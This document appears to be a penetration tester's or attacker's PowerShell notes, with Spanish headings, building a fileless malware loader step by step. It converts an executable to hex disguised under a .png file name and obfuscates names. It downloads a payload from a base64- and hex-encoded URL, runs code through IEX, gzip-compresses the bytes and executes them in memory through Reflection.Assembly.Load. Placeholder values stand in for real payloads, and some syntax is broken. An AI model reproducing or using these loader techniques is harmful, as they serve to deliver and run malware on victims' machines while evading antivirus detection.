1-
$a = [System.IO.File]::ReadAllBytes("C:\Users\pente\Desktop\CARGA.exe")
$MM = [System.BitConverter]::ToString($a) -replace("-","")
$MM | Out-File c:\salida.png


2-
function sAcHCHPN {
    param($IITJCmN)
    $IITJCmN = $IITJCmN -split '(..)' | ? { $_ }
    ForEach ($KMCAYfPj in $IITJCmN){
        [Convert]::ToInt32($KMCAYfPj,16)
    }
}

$cargaSTR = "234234234243324"
[Byte[]] $CARGABYTES = sAcHCHPN $cargaSTR
[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)

3- remota
function sAcHCHPN {
    param($IITJCmN)
    $IITJCmN = $IITJCmN -split '(..)' | ? { $_ }
    ForEach ($KMCAYfPj in $IITJCmN){
        [Convert]::ToInt32($KMCAYfPj,16)
    }
}

$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
[Byte[]] $CARGABYTES = sAcHCHPN $cargaSTR
[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)


4-codificar la funcion

$funcion = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
IEX $funcion
start-sleep -s3

$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
[Byte[]] $CARGABYTES = CALL $cargaSTR
[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)


5-pasar link base64 a hexadecimal

$funcion = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
IEX $funcion
start-sleep -s3

"hexadecimal"
$XaWeRT = "hexadecimal"

function HexToString($i){
    $r = ""
    for ($n = 0; $n -lt $i.Length: $n +=2)
        {$r += [char][int]("0x" + $i.Substring($n,2))}
    return $r    
    }
    $llamar = HexToString $XaWeRT

$linkcodi = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('rtretertrtter')
$cargaSTR = (New-Object net.webclient).DownloadString('$linkcodi')
[Byte[]] $CARGABYTES = CALL $cargaSTR
[System.Reflection.Assembly]::Load([Byte[]]($CARGABYTES)).entrypoint.invoke($null,$null)


COMPRESION DE BYTES PUNTO ENTRADA COMPLETO

1 [Reflection.Assembly]::Load([Byte[]](BYTES DE UN EXE)).EntryPoint.Invoke($null,$null)


function B2G {
    param([byte[]]$Data)
    Process {
    $out = [System.IO.MemoryStream]::new()
    $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress)

      $gStream.Write($Data, 0, $Data.Length)
      $gStream.Close()
    return $out.ToArray()
  }
   }
   
[Byte[]]$CARGA = ()
$CONVERT = B2G $CARGA
$CONVERT-join "," | Out-File c:\salida.txt



function G2B {  
param([byte[]]$Data)
	Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data )
	    $output = New-Object System.IO.MemoryStream
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
	    $gStream.CopyTo( $output )
        $gStream.Close()
		$SrcData.Close()
		[byte[]] $byteArr = $output.ToArray()
        return $byteArr
    }
}

[Byte[]]$CARGA = (bytes)
$call = G2B $CARGA

[System.Reflection.Assembly]::Load([Byte[]]($call)).entrypoint.invoke($null,$null)























